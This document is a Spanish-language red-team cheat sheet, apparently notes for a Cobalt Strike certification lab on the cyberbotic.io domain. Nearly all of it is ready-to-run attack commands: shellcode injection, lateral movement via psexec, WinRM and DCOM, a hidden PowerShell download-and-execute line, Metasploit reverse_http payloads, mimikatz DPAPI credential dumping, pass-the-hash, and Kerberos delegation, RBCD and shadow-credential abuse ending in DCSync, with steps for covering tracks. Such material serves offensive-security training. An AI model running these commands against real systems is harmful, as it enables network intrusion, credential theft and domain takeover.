## **Process Injection**
La **inyección de procesos** nos permite inyectar shellcode arbitrario en un proceso de nuestra elección. Solo puedes inyectar en procesos a los que puedas obtener un handle con suficientes privilegios para escribir en su memoria. En un contexto no elevado, esto generalmente te limita a tus propios procesos. En un contexto elevado, esto incluye procesos pertenecientes a otros usuarios.

Beacon tiene dos comandos principales de inyección: `shinject` e `inject`. `shinject` permite inyectar cualquier shellcode arbitrario desde un archivo binario en tu máquina atacante; e `inject` inyectará una carga útil completa de Beacon para el listener especificado.
```r
# Injectar Beacon en un proceso existente

# 1. Inyectar un Beacon en un proceso específico usando su PID.
# Ejemplo:
beacon> inject 4464 x64 tcp-local
[*] Tasked beacon to inject windows/beacon_bind_tcp (127.0.0.1:4444) into 4464 (x64)
[+] established link to child beacon: 10.10.123.102

# Detalles:
# - `4464`: El PID del proceso de destino.
# - `x64`: La arquitectura del proceso (en este caso, 64 bits).
# - `tcp-local`: El nombre del listener configurado.

# 2. Inyectar un payload desde un binario ejecutable con `shinject`.
# Ejemplo:
beacon> shinject /path/to/binary

# Notas:
# - Este comando carga e inyecta el shellcode desde el binario especificado directamente en un proceso remoto.
# - Ideal para situaciones en las que no deseas cargar el payload desde el servidor de Cobalt Strike.
```

---
# Lateral Movement
⚠️ **OPSEC** Usa el comando `spawnto` para cambiar el proceso que Beacon lanzará para sus tareas de post-explotación. El valor predeterminado es `rundll32.exe`.

- **portscan:** Realiza un escaneo de puertos en un objetivo específico.
  `portscan [ip or ip range] [ports]`
  `portscan 172.16.48.0/24 1-2048,3000,8080`

- **runas:** Un contenedor de `runas.exe`, usando credenciales puedes ejecutar un comando como otro usuario.
  `runas [DOMAIN\user] [password] [command] [arguments]`
  `runas CORP\Administrator securePassword12! Powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.50.90:80/filename'))"`

- **pth:** Proporcionando un nombre de usuario y un hash NTLM, puedes realizar un `Pass The Hash attack` e inyectar un TGT en el proceso actual.  **Este módulo necesita privilegios de Administrador. ❗**
  `pth [DOMAIN\user] [hash]
  `pth CORP\Administrator 97fc053bc0b23588798277b22540c40d`

- **steal_token:** Roba un token de un proceso específico.

- **make_token:** Proporcionando credenciales, puedes crear un token de suplantación en el proceso actual y ejecutar comandos desde el contexto del usuario suplantado.
  `make_token DEV\mssql_svc Cyberb0tic`

- **jump:** Proporciona una forma fácil y rápida de moverse lateralmente usando `winrm` o `psexec` para iniciar una nueva sesión de Beacon en un objetivo.  El módulo `jump` utilizará el token de delegación/suplantación actual para autenticarse en el objetivo remoto ❗. Podemos combinar el módulo `jump` con los módulos `make_token` o `pth` para un "salto" rápido a otro objetivo en la red.
  `jump [psexec64,psexec,psexec_psh,winrm64,winrm] [server/workstation] [listener]`
  `jump psexec64 DC01 Lab-HTTPS`
  `jump winrm WS04 Lab-SMB`
  `jump psexec_psh WS01 Lab-DNS`

- **remote-exec:** Ejecuta un comando en un objetivo remoto usando `psexec`, `winrm` o `wmi`.  El módulo `remote-exec` utilizará el token de delegación/suplantación actual para autenticarse en el objetivo remoto ❗.
  `remote-exec [method] [target] [command]`

- **ssh/ssh-key:** Autenticación usando `ssh` con contraseña o clave privada. Funciona tanto para hosts Linux como Windows.

⚠️ Todos los comandos lanzan `powershell.exe`.

**OPSEC Pass-the-Hash:**
`mimikatz sekurlsa::pth /user:xxx /domain:xxx /ntlm:xxxx /run:"powershell -w hidden"`
`steal_token PID`

**Asumir el control del artefacto**
Usa `link` para conectarte a un Beacon SMB
Usa `connect` para conectarte a un Beacon TCP

## **jump**
```r
# Jump

# 1. Usar `jump` para moverse lateralmente con diferentes métodos.
beacon> jump psexec/psexec64/psexec_psh/winrm/winrm64 ComputerName beacon_listener

# 2. Ejemplo con `winrm64`.
# Utilizar Windows Remote Management para ejecutar un beacon listener en el objetivo.
beacon> jump winrm64 web.dev.cyberbotic.io smb

# 3. Subir un archivo binario de servicio y crear un servicio de Windows para ejecutarlo como SYSTEM.
beacon> jump psexec64 web.dev.cyberbotic.io smb
beacon> jump psexec64 sql-2.dev.cyberbotic.io smb

# 4. Ejecutar un comando PowerShell codificado (32 bits) usando `psexec_psh`.
# Este método utiliza Powershell con una línea de comando codificada en Base64.
beacon> jump psexec_psh web smb
```

## **remote-exec**
```r
# remote-exec

# 1. Usar remote-exec con psexec, winrm o wmi para ejecutar un binario cargado en el sistema remoto.
beacon> remote-exec psexec/winrm/wmi ComputerName <uploaded binary on remote system>

# 2. Ejemplo con WMI (Windows Management Instrumentation).
# Subir el payload al sistema remoto y ejecutarlo.
beacon> cd \\web.dev.cyberbotic.io\ADMIN$
beacon> upload C:\Payloads\smb_x64.exe
beacon> remote-exec wmi web.dev.cyberbotic.io C:\Windows\smb_x64.exe

# 3. Establecer un enlace con el sistema comprometido.
beacon> link web.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337

# 4. Ejecutar un binario .NET remotamente.
# Ejemplo con Seatbelt para recopilar información de OS.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

# 5. Otra forma: Remote-Exec con SharpWMI.
# Usar SharpWMI para ejecutar comandos en el sistema remoto.
beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=web.dev.cyberbotic.io command="C:\Windows\smb_x64.exe"

```

## **Invoke-DCOM**
```r
# Invoke DCOM (OPSEC)

# 1. Importar el script Invoke-DCOM en la sesión actual.
beacon> powershell-import C:\Tools\Invoke-DCOM.ps1

# 2. Cambiar al directorio ADMIN$ en el sistema objetivo.
beacon> cd \\web.dev.cyberbotic.io\ADMIN$

# 3. Subir el payload al sistema objetivo.
beacon> upload C:\Payloads\smb_x64.exe

# 4. Ejecutar el payload en el sistema objetivo utilizando DCOM.
beacon> powershell Invoke-DCOM -ComputerName web.dev.cyberbotic.io -Method MMC20.Application -Command C:\Windows\smb_x64.exe

# 5. Establecer un enlace con el sistema comprometido.
beacon> link web.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337

# NOTA: Al usar remote-exec para movimiento lateral, genera un binario del servicio de Windows.
# Esto es porque psexec crea un servicio apuntando al binario subido para su ejecución.

```

---
# Session Passing

## Beacon Passing
```r
# Crear un Beacon HTTP alternativo en Cobalt Strike con DNS como lifeline

# 1. Generar un nuevo Beacon HTTP alternativo desde una sesión existente.
# Esto crea una conexión de respaldo para persistencia en caso de fallo de la conexión principal.
beacon> spawn x64 http

# 2. Configurar el nuevo Beacon HTTP en Cobalt Strike.
# Asegúrate de que el perfil HTTP esté configurado correctamente para comunicarse con el servidor.

# 3. Mantener DNS como lifeline.
# Configura un listener DNS para que actúe como canal secundario en caso de pérdida del canal HTTP.
```

## Metasploit

### Foreign Listener (x86)
```r
# De Cobalt Strike hacia Metasploit - Staged Payload (solo payloads x86)

# 1. Configurar un listener en Metasploit.
attacker@ubuntu ~> sudo msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST ens5
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run

# 2. Configurar el Foreign Listener en Cobalt Strike.
#    - HTTP Host (Stager): 10.10.5.50
#    - HTTP Port (Stager): 8080

# 3. Usar Jump psexec en Cobalt Strike para ejecutar el payload de Beacon y pasar la sesión.
beacon> jump psexec Foreign_listener
```

### Shellcode Injection
```r
# De Cobalt Strike hacia Metasploit - Stageless Payload

# 1. Configurar un listener en Metasploit.
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
msf6 exploit(multi/handler) > set LHOST 10.10.5.50
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit

# 2. Generar un binario stageless con msfvenom.
ubuntu@DESKTOP-3BSK7NO > msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin

# 3. Inyectar el shellcode de Metasploit en la memoria de un proceso desde Cobalt Strike.
beacon> shspawn x64 C:\Payloads\msf_http_x64.bin

```

### Compatibility Options
```r
# Configuración de Payload con Meterpreter

# 1. Seleccionar el Payload.
# Puedes usar `windows/meterpreter/reverse_http` o `windows/meterpreter/reverse_https`.
msf> use exploit/multi/handler
msf> set PAYLOAD windows/meterpreter/reverse_https

# 2. Configurar LHOST y LPORT apuntando al beacon.
msf> set LHOST <IP_BEACON>
msf> set LPORT <PUERTO_BEACON>

# 3. Configurar opciones adicionales.
# Deshabilitar el Payload Handler.
msf> set DisablePayloadHandler True
# Habilitar migración previa para mayor persistencia.
msf> set PrependMigrate True

# 4. Lanzar el exploit en modo Job (-j).
msf> exploit -j
```

---
# Data Protection API
```r
# Usar Mimikatz para volcar/dumpear secrets desde Windows Vault

# 1. Volcar/dumpear todos los secrets almacenados en el Windows Vault.
beacon> mimikatz !vault::list
beacon> mimikatz !vault::cred /patch

# 2. Enumerar las credenciales almacenadas.
# Verificar si el sistema tiene credenciales guardadas en el web o windows vault.
beacon> run vaultcmd /list
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
beacon> run vaultcmd /listcreds:"Web Credentials" /all

# 3. Utilizar Seatbelt para obtener información más detallada del Windows Vault.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
```
## **Credential Manager**
```r
# Extracción de contraseñas RDP almacenadas

# 1. Enumerar la ubicación del blob de credenciales cifrado.
# (Devuelve el ID del blob cifrado y el GUID de la Master Key).
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

# 2. Verificar el blob de credenciales en el directorio de credenciales del usuario.
# (Anotar el ID del blob cifrado).
beacon> ls C:\Users\bfarmer\AppData\Local\Microsoft\Credentials

# 3. La Master Key está almacenada en el directorio Protect del usuario.
# (Anotar el GUID de la Master Key que coincida con Seatbelt).
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\
beacon> ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104

# 4. Descifrar la Master Key.
# (Debe ejecutarse en el contexto del usuario que posee la clave, usar el modificador @).
# Ejecutar como SYSTEM - WKSTN-2.
beacon> mimikatz !sekurlsa::dpapi

# Ejecutar como BFARMER - WKSTN-2.
beacon> mimikatz dpapi::masterkey /in:C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\S-1-5-21-569305411-121244042-2357301523-1104\bfc5090d-22fe-4058-8953-47f6882f549e /rpc

# 5. Usar la Master Key para descifrar el blob de credenciales.
beacon> mimikatz dpapi::cred /in:C:\Users\bfarmer\AppData\Local\Microsoft\Credentials\6C33AC85D0C4DCEAB186B3B2E5B1AC7C /masterkey:8d15395a4bd40a61d5eb6e526c552f598a398d530ecc2f5387e07605eeab6e3b4ab440d85fc8c4368e0a7ee130761dc407a2c4d58fcd3bd3881fa4371f19c214
```

## **Scheduled Task Credentials**
```r
# Credenciales de tareas programadas

# 1. Las credenciales del Task Scheduler están almacenadas en un blob cifrado en la siguiente ubicación.
beacon> ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

# 2. Identificar el GUID de la Master Key asociada con el blob cifrado (Ejemplo: F31...B6E).
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E

# 3. Volcar/Dumpear todas las Master Keys y filtrar la correspondiente al GUID identificado en el paso anterior.
beacon> mimikatz !sekurlsa::dpapi

# 4. Usar el Blob cifrado y la Master Key identificada para descifrar y extraer la contraseña en texto plano.
beacon> mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\F3190EBE0498B77B4A85ECBABCA19B6E /masterkey:10530dda04093232087d35345bfbb4b75db7382ed6db73806f86238f6c3527d830f67210199579f86b0c0f039cd9a55b16b4ac0a3f411edfacc593a541f8d0d9

```

# Kerberos

## **Kerberoasting**
```r
# Kerberoasting

# 1. Buscar en Active Directory todos los objetos de tipo usuario con el atributo _servicePrincipalName_ definido.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# 2. Ejecutar el modo _kerberoast_ de Rubeus para el usuario objetivo (por ejemplo: mssql_svc).
# Esto solicita un TGS (Ticket Granting Service) para esa cuenta.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
# Ejemplo de salida:
$krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc/sql-2.dev.cyberbotic.io:1433@dev.cyberbotic.io*$E<SNIPPED>0B696

# 3. Ejecutar hashcat para crackear el TGS obtenido.
ps> hashcat -a 0 -m 13100 hashes wordlist
```

## **ASREP-Roasting**
```r
# ASREP Roasting

# 1. Consultar Active Directory para listar todos los usuarios con el flag "Don't require preauthentication" habilitado (valor 4194304).
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# 2. Solicitar el ASREP de la cuenta objetivo (por ejemplo: squid_svc).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
# Ejemplo de salida:
$krb5asrep$squid_svc@dev.cyberbotic.io:FA<SNIPPED>495

# 3. Ejecutar hashcat para crackear el hash ASREP.
ps> hashcat -a 0 -m 18200 squid_svc.hash wordlist

```

## **Uncontrained Delegation**
```r
# Unconstrained Delegation
# Almacena en caché el TGT de cualquier usuario que acceda a su servicio.

# 1. Identificar los objetos de computadora con Unconstrained Delegation habilitada.
# Nota: Los Domain Controllers siempre tienen permiso para unconstrained delegation.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Ejemplo de laboratorio:
# [+] samaccountname : DC-2$
# [+] dnshostname    : dc-2.dev.cyberbotic.io
# [+] samaccountname : WEB$
# [+] dnshostname    : web.dev.cyberbotic.io

# 2. Volcar el TGT almacenado en caché en el sistema afectado (requiere acceso de sistema).
beacon> getuid

# Listar los tickets de Kerberos en caché en la sesión de logon actual o en todas las sesiones (requiere sesión privilegiada).
# En este caso necesitamos las del Domain Admin (nlamb @ DEV.CYBERBOTIC.IO krbtgt/DEV.CYBERBOTIC.IO).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# 3. Dumpear el ticket TGT almacenado en caché.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap

# 4. Inyectar el TGT y acceder al servicio.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=

beacon> steal_token 1540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

```r
# Método Rubeus Monitor

# 1. Obtener el ticket de nlamb utilizando el método Monitor.
# (El comando monitor verifica periódicamente los tickets en el sistema).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

# 2. Inyectar el ticket obtenido y acceder al servicio.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj<CODE SNIPPED>MuSU8=

beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

```r
# Método S4U

# 1. Ejecutar el ataque PrintSpool para forzar al DC a autenticarse con WEB (TARGET / LISTENER).
# (Desde WKSTN-2 como BFARMER en el laboratorio).
beacon> execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

# 2. Usar el Machine TGT obtenido para ganar RCE en sí mismo utilizando S4U abuse (flag /self).
# (Usar el TICKET de DC-2$ en el caso del laboratorio).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

# 3. Inyectar el ticket y acceder al servicio.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

beacon> steal_token 2664
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```


## **Constrained Delegation**
```r
# Constrained Delegation
# Permite solicitar TGS para cualquier usuario usando su TGT.

# 1. Identificar los objetos de computadora con Constrained Delegation habilitada.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto

# 2. Realizar el ataque desde una cuenta con Constrained Delegation habilitada.
# En el ejemplo del laboratorio, este ataque se realiza desde MSSQL_SVC utilizando una técnica de User Impersonation.
beacon> make_token DEV\mssql_svc Cyberb0tic
beacon> jump psexec64 sql-2.dev.cyberbotic.io smb
```

```r
# Método S4U
# Volcar/Dumpear el KRBTGT de la cuenta de Usuario/Computadora con Constrained Delegation habilitada.
# (Usar asktgt si se tiene el hash NTLM).

# 1. Mostrar el usuario y contexto de seguridad bajo el cual se está ejecutando el beacon.
beacon> getuid
# 2. Enumerar todos los tickets Kerberos activos en la memoria con la función "triage" de Rubeus.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# En el ejemplo del laboratorio (sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# 3. Usar la técnica S4U para solicitar un TGS para el servicio delegado utilizando el TGT de la máquina.
# (Se utiliza el S4U2Proxy ticket).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /user:sql-2$ /ticket:doIFLD[...snip...]MuSU8= /nowrap

# 4. Inyectar el S4U2Proxy ticket generado en el paso anterior.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

# 5. Acceder al servicio utilizando el token robado.
beacon> steal_token 5540
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

```r
# Método S4U (Alternate Service Name).
# Volcar el KRBTGT de la cuenta de Usuario/Computadora con Constrained Delegation habilitada.

# 1. Mostrar el usuario y contexto de seguridad bajo el cual se está ejecutando el beacon.
beacon> getuid

# 2. Enumerar todos los tickets Kerberos activos en la memoria con la función "triage" de Rubeus.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# 3. Volcar el KRBTGT del laboratorio (sql-2$ @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# 4. Acceder a otro servicio alternativo no especificado en el atributo de Delegation (ejemplo: LDAP).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket:doIFpD[...]MuSU8= /nowrap

# 5. Inyectar el S4U2Proxy ticket generado en el paso anterior.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGaD[...]ljLmlv

# 6. Acceder al servicio utilizando el ticket inyectado.
beacon> steal_token 2628
beacon> ls \\dc-2.dev.cyberbotic.io\c$
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

## **S4U2Self**
```r
# 1. Solicitar e inyectar el ticket S4U2Proxy con Rubeus.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:dc-2$ /ticket:doIF<CODE SNIPPED>DLklP /impersonateuser:nlamb /altservice:cifs/dc-2.dev.cyberbotic.io /self /ptt

# 2. Verificar el ticket inyectado.
beacon> run klist
Server: cifs/dc-2.dev.cyberbotic.io @ DEV.CYBERBOTIC.IO

# 3. Acceder a recursos utilizando el ticket inyectado.
beacon> ls \\dc-2.dev.cyberbotic.io\c$
[*] Listing: \\dc-2.dev.cyberbotic.io\c$\

# 4. Limpiar la caché de tickets.
beacon> run klist purge
```

## **Resource-Based Contrained Delegation (RBCD)**
```r
# Resource-Based Constrained Delegation (Sistemas con msDS-AllowedToActOnBehalfOfOtherIdentity escribible)

# 1. Identificar los objetos de computadora que tienen definido el atributo msDS-AllowedToActOnBehalfOfOtherIdentity.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" --attributes dnshostname,samaccountname,msDS-AllowedToActOnBehalfOfOtherIdentity --json

# 2. Identificar las computadoras del dominio donde podemos escribir este atributo con un valor personalizado.
beacon> powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

# 3. Traducir un SID a un nombre de cuenta para mayor claridad.
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
```

```r
# Método 1: Computador ya existente (Ejemplo: WKSTN-2)
# Realizar un ataque RBCD usando una computadora existente.

# 1. Asignar derechos de delegación a la computadora modificando el atributo del sistema objetivo.
beacon> powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)";
beacon> powerpick $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0);
beacon> powerpick Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

# 2. Verificar que el atributo de delegación se haya actualizado correctamente.
beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 3. Obtener el TGT de nuestra computadora (WKSTN-2 como BFARMER*).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# 4. Usar la técnica S4U para obtener el TGS del sistema objetivo utilizando el TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD[...]5JTw== /nowrap

# 5. Acceder a los servicios del sistema objetivo.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
beacon> steal_token 4092
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# 6. Eliminar los derechos de delegación para limpiar rastros.
beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

```r
# Método 2: Crear un computador falso (Ejemplo: EvilComputer)
# Crear una cuenta de computadora falsa para realizar un ataque RBCD.

# 1. Verificar si tenemos permisos para crear una cuenta de computadora (permitido por defecto).
beacon> powerpick Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

# 2. Crear una computadora falsa con contraseña aleatoria y generar su hash.
beacon> execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer EvilComputer --make
PS> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

# 3. Usar el hash generado para obtener un TGT de la computadora falsa.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79DCC14E6508DA9536CD949D857B54AE4E119162A865C40B3FFD46059F7044 /nowrap

# 4. Asignar derechos de delegación a la computadora falsa modificando el atributo del sistema objetivo.
beacon> powerpick Get-DomainComputer -Identity EvilComputer -Properties objectSid
beacon> powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-XXXXX)";
beacon> powerpick $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0);
beacon> powerpick Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose

# 5. Verificar que el atributo de delegación se haya actualizado correctamente.
beacon> powerpick Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# 6. Usar la técnica S4U para obtener el TGS del sistema objetivo utilizando el TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIF8jCCBe<CODE SNIPPED>aWMuaW8= /nowrap

# 7. Acceder a los servicios del sistema objetivo.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD[...]MuaW8=
beacon> steal_token 4092
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# 8. Eliminar los derechos de delegación para limpiar rastros.
beacon> powerpick Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

## **Shadow Credentials**
```r
# Shadow Credentials (Sistemas con msDS-KeyCredentialLink escribible)

# 1. Listar cualquier clave existente en el objetivo (útil para limpieza posterior).
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$

# 2. Agregar un nuevo par de claves al objetivo.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:dc-2$

# 3.1. Solicitar un TGT usando el comando Rubeus proporcionado por Whisker.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuAI<CODE SNIPPED>2RwICB9A=
/password:"Bj4qg5Q3gvPTGrLZ" /nowrap

# 3.2. Solicitar un TGT con encriptación AES256.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuAI<CODE SNIPPED>2RwICB9A=
/password:"Bj4qg5Q3gvPTGrLZ" /enctype:aes256 /nowrap

# 4. Usar la técnica S4U para obtener el TGS del sistema objetivo utilizando nuestro TGT.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap

# 5. Inyectar el S4U2Proxy ticket obtenido en el paso anterior.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD[...]MuaW8=

# 6. Limpiar las credenciales creadas (opcional, por OPSEC).
# 6.1. Listar todas las credenciales presentes.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:dc-2$

# 6.2. Limpiar todas las credenciales.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe clear /target:dc-2$

# 6.3. Remover credenciales específicas manualmente.
beacon> execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:dc-2$ /deviceid:6fc40b8d-dcb1-425d-b2d6-795be4211d18
```

## Kerberos Relay Attacks

## Malleable profile
```r 
# 1. Detener el servicio `teamserver.service`
sudo systemctl stop teamserver.service
sudo systemctl status teamserver.service

# 2. Hacer un respaldo del profile `webbug.profile`
cd cobaltstrike/c2-profiles/normal/webbug.profile
cp webbug.profile crto.profile

# 3. Modificar el profile `crto.profile`
nano crto.profile

# 4. Agregar la siguiente línea al principio del archivo
# set tasks_max_size "2097152";

